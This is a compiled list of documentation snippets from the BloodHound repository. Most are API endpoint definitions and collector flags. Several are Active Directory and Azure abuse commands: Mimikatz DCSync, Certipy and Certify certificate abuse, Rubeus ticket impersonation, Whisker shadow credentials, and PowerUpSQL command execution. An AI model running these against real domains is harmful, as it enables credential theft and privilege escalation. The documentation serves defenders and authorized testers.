**Clarity** - Provide clear guidelines for vocabulary, phrasing, and structuring a RFC.\n- **Completeness** - Ensure each RFC includes all necessary contextual information, references, and supporting materials for readers and decision makers.\n```\n```\n\n----------------------------------------\n\nTITLE: Moving AzureHound Certificate Files in PowerShell\nDESCRIPTION: Moves AzureHound certificate and key files to a central location using PowerShell.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-azurehound/installation-options.mdx#2025-04-23_snippet_2\n\nLANGUAGE: powershell\nCODE:\n```\nMove-Item \"$env:USERPROFILE\\.config\\azurehound\\*.pem\" \"C:\\ProgramData\\azurehound\\\"\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Definition for Deleting Asset Group Selector\nDESCRIPTION: Defines the OpenAPI specification for the DELETE endpoint that removes a specific selector from an asset group. The endpoint requires both the asset group ID and selector ID as path parameters.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/asset-isolation/delete-an-asset-group-selector.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /api/v2/asset-groups/{asset_group_id}/selectors/{asset_group_selector_id}\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint Definition - DCOM Rights\nDESCRIPTION: OpenAPI specification defining the GET endpoint for retrieving DCOM rights for a specific group. The endpoint takes an object_id path parameter to identify the target group.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/groups/get-group-entity-dcomrights.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/groups/{object_id}/dcom-rights\n```\n\n----------------------------------------\n\nTITLE: Setting Mail Attribute of Victim Computer Using PowerView\nDESCRIPTION: This command uses PowerView to set a dummy mail attribute for the victim computer, which may be required for certificate enrollment if the template has email flags.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nSet-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}\n```\n\n----------------------------------------\n\nTITLE: Configuring Loop Interval for SharpHound Session Collection\nDESCRIPTION: Command to run SharpHound session collection with both a specified loop duration and interval between collection cycles.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound-flags.mdx#2025-04-23_snippet_11\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe --CollectionMethods Session --Loop --Loopduration 12:30:12 --LoopInterval 00:15:00\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Route Definition - GET OU Computers\nDESCRIPTION: API route specification for retrieving computers associated with an Organizational Unit using its object_id parameter\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ous/get-ou-entity-computers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/ous/{object_id}/computers\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Endpoint for BloodHound Permissions\nDESCRIPTION: OpenAPI specification defining the GET endpoint for retrieving permissions at /api/v2/permissions. The endpoint appears to be available in both Enterprise and Community editions based on the included image tag.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/permissions/list-permissions.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/permissions\n```\n\n----------------------------------------\n\nTITLE: Executing DCSync Attack with Mimikatz in PowerShell\nDESCRIPTION: This command uses Mimikatz to perform a DCSync attack, retrieving the password hash of the Administrator user from the testlab.local domain.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/dc-sync.mdx#2025-04-23_snippet_0\n\nLANGUAGE: PowerShell\nCODE:\n```\nlsadump::dcsync /domain:testlab.local /user:Administrator\n```\n\n----------------------------------------\n\nTITLE: Requesting Enrollment Agent Certificate (Linux)\nDESCRIPTION: Use Certipy to request an enrollment agent certificate from the specified CA and template in a Linux environment.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc3.mdx#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ncertipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name\n```\n\n----------------------------------------\n\nTITLE: Creating ASP Harness Function in PostgreSQL\nDESCRIPTION: Implements a harness function for All Shortest Path traversal that manages temporary tables for pathspace exploration. The function takes primer and recursive queries as parameters and handles path expansion up to a maximum depth.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/models/pgsql/translate/README.md#2025-04-23_snippet_9\n\nLANGUAGE: postgresql\nCODE:\n```\ncreate or replace function public.asp_harness(primer_query text, recursive_query text, max_depth int4)\n    returns table\n            (\n                root_id   int4,\n                next_id   int4,\n                depth     int4,\n                satisfied bool,\n                is_cycle  bool,\n                path      int4[]\n            )\nas\n$$\ndeclare\n    depth int4 := 1;\nbegin\n    create temporary table pathspace\n    (\n        root_id   int4   not null,\n        next_id   int4   not null,\n        depth     int4   not null,\n        satisfied bool   not null,\n        is_cycle  bool   not null,\n        path      int4[] not null,\n        primary key (path)\n    ) on commit drop;\n\n    create temporary table next_pathspace\n    (\n        root_id   int4   not null,\n        next_id   int4   not null,\n        depth     int4   not null,\n        satisfied bool   not null,\n        is_cycle  bool   not null,\n        path      int4[] not null,\n        primary key (path)\n    ) on commit drop;\n\n    create index pathspace_next_id_index on pathspace using btree (next_id);\n    create index pathspace_satisfied_index on pathspace using btree (satisfied);\n    create index pathspace_is_cycle_index on pathspace using btree (is_cycle);\n\n    create index next_pathspace_next_id_index on next_pathspace using btree (next_id);\n    create index next_pathspace_satisfied_index on next_pathspace using btree (satisfied);\n    create index next_pathspace_is_cycle_index on next_pathspace using btree (is_cycle);\n\n    execute primer_query;\n\n    while depth < max_depth and not exists(select 1 from next_pathspace np where np.satisfied)\n        loop\n            alter table pathspace\n                rename to pathspace_old;\n            alter table next_pathspace\n                rename to pathspace;\n            alter table pathspace_old\n                rename to next_pathspace;\n\n            truncate table next_pathspace;\n\n            delete\n            from pathspace p\n            where p.is_cycle\n               or not exists(select 1 from edge e where e.start_id = p.next_id);\n\n            depth := depth + 1;\n            execute recursive_query;\n        end loop;\n\n    return query select *\n                 from next_pathspace np\n                 where np.satisfied;\n\n    return;\nend;\n$$\n    language plpgsql volatile\n                     strict;\n```\n\n----------------------------------------\n\nTITLE: Retrieving Foreign GPO Controllers in a Domain via API in BloodHound\nDESCRIPTION: OpenAPI endpoint specification for getting all foreign GPO controllers associated with a domain. This endpoint requires the domain's object ID as a path parameter to identify the specific domain for which to retrieve foreign GPO controllers.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/get-domain-entity-foreign-gpo-controllers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/domains/{object_id}/foreign-gpo-controllers\n```\n\n----------------------------------------\n\nTITLE: Executing OS Commands via OLE Automation in SQL Server with PowerUpSQL\nDESCRIPTION: This command executes operating system commands through SQL Server using OLE Automation via PowerUpSQL's Invoke-SQLOSOle function.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_9\n\nLANGUAGE: powershell\nCODE:\n```\nInvoke-SQLOSOle -Verbose -Command \"Whoami\" -Instance sqlserver\\instance\n```\n\n----------------------------------------\n\nTITLE: Restoring dNSHostName of Victim Computer with Certipy in Windows\nDESCRIPTION: This command uses Certipy to restore the original dNSHostName of the victim computer after the attack to avoid environmental issues.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nCertipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM$ -dns VICTIM.CORP.LOCAL\n```\n\n----------------------------------------\n\nTITLE: Initializing RFC Metadata in YAML Format\nDESCRIPTION: This snippet defines the metadata for the RFC document, including the RFC number, title, authors, status, creation date, and intended audience. It uses YAML syntax within a Markdown file.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/rfc/rfc-template.md#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n---\nbh-rfc: <!-- choose the next integer value that is one greater than the greatest RFC number in `main` in the repo's rfc/ folder. This number may need to change if other RFCs merge into main before it. -->\ntitle: <!-- choose a succinct title -->\nauthors: |\n    <!-- [Author 1](auther1@domain.com) -->\n    <!-- [Author 2](author2@domain.com) -->\nstatus: DRAFT <!-- DRAFT, ACCEPTED, SUPERSEDED BY <RFC identifier> -->\ncreated: 2025-04-15\naudiences: |\n    <!-- Optional: list the indended audience -->\n---\n```\n\n----------------------------------------\n\nTITLE: Querying AD Recycle Bin Retention Period\nDESCRIPTION: PowerShell commands to retrieve the tombstone lifetime (retention period) for deleted objects in Active Directory by querying the Directory Service configuration.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/enterprise-collection/data-retention.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\n$ForestConfigurationNC = (Get-ADRootDSE).configurationNamingContext\nGet-ADObject -Identity \"CN=Directory Service,CN=Windows NT,CN=Services,$ForestConfigurationNC\" -Partition $ForestConfigurationNC -Properties tombstoneLifetime | select tombstoneLifetime\n```\n\n----------------------------------------\n\nTITLE: Basic St Bernard Execution\nDESCRIPTION: Shows the basic command to run St Bernard using Go's run command. This is the simplest way to execute the tool.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/stbernard/README.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ go run github.com/specterops/bloodhound/packages/go/stbernard\n```\n\n----------------------------------------\n\nTITLE: OpenAPI PUT Endpoint Specification for Client Updates\nDESCRIPTION: OpenAPI specification defining the endpoint for updating client information. The endpoint accepts a client ID parameter in the path.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/clients/update-client.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: put /api/v2/clients/{client_id}\n```\n\n----------------------------------------\n\nTITLE: Setting Port Scan Timeout in SharpHound\nDESCRIPTION: Sets the timeout duration for port 445 scanning on remote systems. This command configures SharpHound to wait 1000 milliseconds (1 second) before moving to the next host during port scanning operations.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound-flags.mdx#2025-04-23_snippet_12\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe --PortScanTimeout 1000\n```\n\n----------------------------------------\n\nTITLE: GET NTAuthStore Object Endpoint\nDESCRIPTION: OpenAPI endpoint specification for retrieving a specific NTAuthStore object using its object_id. The endpoint follows the pattern /api/v2/ntauthstores/{object_id}.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/nt-auth-stores/get-nt-auth-store-entity-info.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/ntauthstores/{object_id}\n```\n\n----------------------------------------\n\nTITLE: GET Role by ID Endpoint Definition in OpenAPI\nDESCRIPTION: API endpoint specification for retrieving a specific role by its unique identifier.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/roles/get-role.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/roles/{role_id}\n```\n\n----------------------------------------\n\nTITLE: Enrolling Certificate with Certify on Windows\nDESCRIPTION: This command uses Certify to request a certificate from a specified CA and template. It demonstrates how to exploit AllExtendedRights privilege on a certificate template.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/all-extended-rights.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nCertify.exe request /ca:SERVER\\\\CA-NAME /template:TEMPLATE\n```\n\n----------------------------------------\n\nTITLE: Enrolling Certificate as Victim Computer Using Certipy in Linux\nDESCRIPTION: This command uses Certipy in Linux to request enrollment in the affected certificate template as the victim computer, specifying the target Enterprise CA.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\ncertipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE\n```\n\n----------------------------------------\n\nTITLE: Performing Kerberos Authentication (Windows)\nDESCRIPTION: Uses Rubeus to request a ticket granting ticket (TGT) from the domain, impersonating the target identity.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9a.mdx#2025-04-23_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n.\\Rubeus.exe asktgt /certificate:cert.pfx /user:forestrootda /domain:forestroot.com /ptt\n```\n\n----------------------------------------\n\nTITLE: OpenAPI PUT Endpoint for BloodHound User Secret Management\nDESCRIPTION: API specification for the endpoint that manages user secrets in BloodHound. The endpoint path is /api/v2/bloodhound-users/{user_id}/secret and uses the PUT method to update user secrets.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/bloodhound-users/create-or-set-user-secret.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: put /api/v2/bloodhound-users/{user_id}/secret\n```\n\n----------------------------------------\n\nTITLE: Retrieving Job Status OpenAPI Specification\nDESCRIPTION: OpenAPI specification defining the endpoint for retrieving status details for a specific job by its ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/jobs/get-client-job.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/jobs/{job_id}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Asset Group Members via GET Request in OpenAPI\nDESCRIPTION: This OpenAPI specification defines a GET endpoint for retrieving members of a specific asset group. The endpoint requires the asset group ID as a path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/asset-isolation/list-all-asset-isolation-group-members.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/asset-groups/{asset_group_id}/members\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification for GET /api/v2/features Endpoint\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the GET /api/v2/features endpoint in the BloodHound API. It specifies the HTTP method and the endpoint path for retrieving feature information.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/config/list-feature-flags.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/features\n```\n\n----------------------------------------\n\nTITLE: Resetting Victim UPN After Certificate Enrollment\nDESCRIPTION: Updates the UPN of the victim account to an arbitrary value after successful certificate enrollment.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10a.mdx#2025-04-23_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\ncertipy account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn victim@corp.local\n```\n\n----------------------------------------\n\nTITLE: Running AzureHound with Authentication\nDESCRIPTION: Executes the AzureHound CE collector with specific credentials to gather Azure environment security data. Requires username, password, and tenant information.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/get-started/quickstart/community-edition-quickstart.mdx#2025-04-23_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\n# Run AzureHound CE\nC:\\> AzureHound.exe --username \"MattNelson@contoso.onmicrosoft.com\" --password \"MyVeryStrongPassword\" --tenant \"contoso.onmicrosoft.com\" list\n```\n\n----------------------------------------\n\nTITLE: Defining PUT Endpoint for Updating Asset Group Selectors in BloodHound API\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the PUT endpoint to update selectors of an asset group. It specifies the path, including the asset group ID parameter, for modifying selectors in BloodHound's API.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/asset-isolation/update-asset-group-selectors.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: put /api/v2/asset-groups/{asset_group_id}/selectors\n```\n\n----------------------------------------\n\nTITLE: Creating Asset Groups API Endpoint Definition\nDESCRIPTION: OpenAPI specification for the POST endpoint to create asset groups in BloodHound. The endpoint is located at /api/v2/asset-groups.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/asset-isolation/create-an-asset-group.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: post /api/v2/asset-groups\n```\n\n----------------------------------------\n\nTITLE: Enrolling Certificate Using Certipy on Linux\nDESCRIPTION: Uses Certipy to request a certificate on Linux systems. Requires user credentials, CA name, target server, and template name.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/enroll.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncertipy req -u USER@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE\n```\n\n----------------------------------------\n\nTITLE: Adding Member to Azure Group with BARK\nDESCRIPTION: Demonstrates using BARK's Add-AZMemberToGroup function to add a new principal to a target Azure security group using the previously acquired token.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-add-member.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nAdd-AZMemberToGroup `\n    -PrincipalID = \"028362ca-90ae-41f2-ae9f-1a678cc17391\" `\n    -TargetGroupId \"b9801b7a-fcec-44e2-a21b-86cb7ec718e4\" `\n    -Token $MGToken.access_token\n```\n\n----------------------------------------\n\nTITLE: Defining GET Self Endpoint in OpenAPI for BloodHound\nDESCRIPTION: OpenAPI specification declaring the /api/v2/self endpoint. This endpoint is available in both Enterprise and Community editions of BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/auth/get-self.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/self\n```\n\n----------------------------------------\n\nTITLE: Decrypting LAPS Password with Microsoft LAPS PowerShell Module\nDESCRIPTION: This PowerShell command uses Microsoft's LAPS PowerShell module to retrieve and decrypt the LAPS password for a specific computer.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/read-laps-password.mdx#2025-04-23_snippet_2\n\nLANGUAGE: powershell\nCODE:\n```\nGet-LapsADPassword \"WIN10\" -AsPlainText\n```\n\n----------------------------------------\n\nTITLE: Checking Computer Mail Attribute with PowerView in Windows\nDESCRIPTION: Checks if the victim computer has the mail attribute set, which might be required for certificate enrollment depending on template configuration.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nGet-DomainObject -Identity VICTIM -Properties mail\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Endpoint for Attack Path Types in YAML\nDESCRIPTION: This YAML snippet specifies the OpenAPI endpoint for retrieving attack path types. It defines the HTTP method as GET and the path as /api/v2/attack-path-types.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/attack-paths/list-all-attack-path-types.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/attack-path-types\n```\n\n----------------------------------------\n\nTITLE: Defining POST Endpoint for Client Jobs in BloodHound Enterprise\nDESCRIPTION: This OpenAPI specification defines a POST endpoint for managing client jobs in the BloodHound Enterprise Edition. The endpoint path includes a client ID parameter and targets the '/jobs' resource.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/clients/creates-a-scheduled-job.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: post /api/v2/clients/{client_id}/jobs\n```\n\n----------------------------------------\n\nTITLE: Retrieving Asset Group by ID in BloodHound API\nDESCRIPTION: OpenAPI specification for the GET endpoint that retrieves asset group information using a specific asset group ID. This endpoint is part of the BloodHound API v2 and is available in both Enterprise and Community editions.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/asset-isolation/get-asset-group-by-id.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/asset-groups/{asset_group_id}\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Search Endpoint\nDESCRIPTION: OpenAPI specification defining the search endpoint path and version for BloodHound API.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/search/search-for-objects.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/search\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Prefix to SharpHound Output Files\nDESCRIPTION: Command to add a custom prefix to the output JSON and ZIP files generated by SharpHound, which can help with organizing multiple collection runs.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound-flags.mdx#2025-04-23_snippet_8\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe --OutputPrefix \"Financial Audit\"\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Adding Selectors to Asset Group in BloodHound\nDESCRIPTION: Defines the POST endpoint for adding selectors to an existing asset group. The endpoint URL includes the asset group ID as a path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/asset-isolation/update-asset-group-selectors-1.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /api/v2/asset-groups/{asset_group_id}/selectors\n```\n\n----------------------------------------\n\nTITLE: Checking KDS Root Key Configuration in PowerShell\nDESCRIPTION: Command to verify if KDS Root Key is configured in the domain\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/create-gmsa.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\nGet-KdsRootKey\n```\n\n----------------------------------------\n\nTITLE: Requesting TGT with Impersonated Identity (Windows)\nDESCRIPTION: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc3.mdx#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nRubeus.exe asktgt /user:itadmin /domain:corp.local /certificate:itadminenrollment.pfx\n```\n\n----------------------------------------\n\nTITLE: Acquiring MS Graph Token for Service Principal with PowerShell BARK\nDESCRIPTION: Uses BARK's Get-MSGraphTokenWithClientCredentials function to obtain an MS Graph-scoped JWT by providing a Service Principal's Client ID, secret, and tenant name.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-grant-app-roles.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\n$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `\n    -ClientSecret \"asdf...\" `\n    -TenantName \"contoso.onmicrosoft.com\"\n```\n\n----------------------------------------\n\nTITLE: API Response for Migration Status in JSON\nDESCRIPTION: Example JSON response structure for the /pg-migration/status/ endpoint, showing the possible states of the migration process.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/cmd/api/src/api/tools/PG_MIGRATE.md#2025-04-23_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"state\": \"idle\" | \"migrating\" | \"canceling\"\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Whisker to Add Shadow Credentials in Bash\nDESCRIPTION: This command uses Whisker to add Shadow Credentials to a target principal. The 'add' command is used with the '/target' parameter specifying the target principal.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/add-key-credential-link.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nWhisker.exe add /target:<TargetPrincipal>\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Updating Events in BloodHound Enterprise\nDESCRIPTION: OpenAPI specification for the PUT /api/v2/events/{event_id} endpoint that allows updating event data by ID. This endpoint is part of the BloodHound Enterprise Edition API.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/events-schedules/update-event.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: put /api/v2/events/{event_id}\n```\n\n----------------------------------------\n\nTITLE: GET User Details API Endpoint\nDESCRIPTION: OpenAPI specification defining the endpoint to retrieve a specific BloodHound user's information by their ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/bloodhound-users/get-a-user.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/bloodhound-users/{user_id}\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Markdown Link Formatting in RFC Documentation\nDESCRIPTION: Example showing proper formatting for both inline and reference-style links in Markdown documentation. Demonstrates two different approaches to linking external resources.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/rfc/bh-rfc-0.md#2025-04-23_snippet_6\n\nLANGUAGE: markdown\nCODE:\n```\nThis is an inline link to [this repository](https://github.com/SpecterOps/BloodHound).\n\nThis is a reference link to [this repository][1] and another link to the [SpecterOps website][2].\n\n[1]: https://github.com/SpecterOps/BloodHound\n[2]: https://specterops.io\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI POST Endpoint for SAML Providers\nDESCRIPTION: OpenAPI specification defining the POST endpoint path for SAML provider configuration. The endpoint is located at /api/v2/saml/providers.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/auth/create-a-new-saml-provider-from-metadata.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /api/v2/saml/providers\n```\n\n----------------------------------------\n\nTITLE: Query Profiling in Cypher\nDESCRIPTION: Shows how to profile query execution using the PROFILE clause. Useful for query optimization and performance analysis.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_33\n\nLANGUAGE: cypher\nCODE:\n```\nPROFILE MATCH (V:Label) WHERE V.Name = 'indexed name' RETURN V;\n```\n\n----------------------------------------\n\nTITLE: Setting UPN of Victim (Windows)\nDESCRIPTION: Sets the User Principal Name (UPN) of the victim principal to match the sAMAccountName of the targeted principal using PowerView.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9a.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nSet-DomainObject -Identity VICTIM -Set @{'userprincipalname'='Target'}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Asset Group Member Counts - OpenAPI Definition\nDESCRIPTION: OpenAPI endpoint definition for getting member counts from a specified asset group. The endpoint requires an asset_group_id parameter in the URL path.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/asset-isolation/list-asset-group-member-count-by-kind.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/asset-groups/{asset_group_id}/members/counts\n```\n\n----------------------------------------\n\nTITLE: Creating gMSA Password Read Group\nDESCRIPTION: PowerShell script to create a security group for gMSA password access\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/create-gmsa.mdx#2025-04-23_snippet_2\n\nLANGUAGE: powershell\nCODE:\n```\n$gmsaName = \"t0\\_gMSA\\_SHS\" # Name of the gMSA\n$pwdReadOUDN = \"&lt;DISGINGUISHED_NAME&gt;\" # Distinguished Name of OU to create the password read group in\n\nNew-ADGroup `\n-Name \"$($gmsaName)_pwdRead\" `\n-GroupScope Global `\n-GroupCategory Security `\n-Path $pwdReadOUDN `\n-Description \"This group grants the rights to retrieve the password of the BloodHound Enterprise data collector (SharpHound Enterprise) gMSA '$gmsaName'.\" `\n-PassThru\n```\n\n----------------------------------------\n\nTITLE: Checking Certificate Template Ownership in PowerShell\nDESCRIPTION: This PowerShell snippet checks the current ownership of a specified certificate template.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\n$templateName = \"TemplateName\" # Use CN, not display name\n\n# Find the certificate template\n$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")\n$template = [ADSI]\"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"\n\n# Print the owner\n$acl = $template.psbase.ObjectSecurity\n$acl.Owner\n```\n\n----------------------------------------\n\nTITLE: Acquiring MS Graph Token with Client Credentials in PowerShell using BARK\nDESCRIPTION: This code demonstrates how to obtain an MS Graph-scoped JWT token using a Service Principal's Client ID and secret with BARK's Get-MSGraphTokenWithClientCredentials function. The token is stored in a variable for later use in role assignments.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-grant-role.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\n$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `\n    -ClientSecret \"asdf...\" `\n    -TenantName \"contoso.onmicrosoft.com\"\n```\n\n----------------------------------------\n\nTITLE: Retrieving SSO Providers - OpenAPI Endpoint\nDESCRIPTION: API endpoint specification for getting SSO provider configuration details. Uses OpenAPI syntax to define the GET request path.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/auth/list-sso-providers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/sso-providers\n```\n\n----------------------------------------\n\nTITLE: OpenAPI OIDC Provider Endpoint Specification\nDESCRIPTION: OpenAPI specification for POST endpoint that creates OIDC SSO providers. The path is 